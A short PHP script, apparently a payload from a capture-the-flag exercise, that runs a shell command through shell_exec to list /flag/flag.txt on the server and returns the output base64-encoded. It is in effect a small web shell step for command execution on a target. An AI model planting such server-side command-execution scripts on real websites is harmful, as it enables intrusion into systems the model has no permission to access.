<?php
// list /flag directory and return base64 to avoid content-type issues
$out = shell_exec('ls -la /flag/flag.txt 2>&1');
echo base64_encode($out);
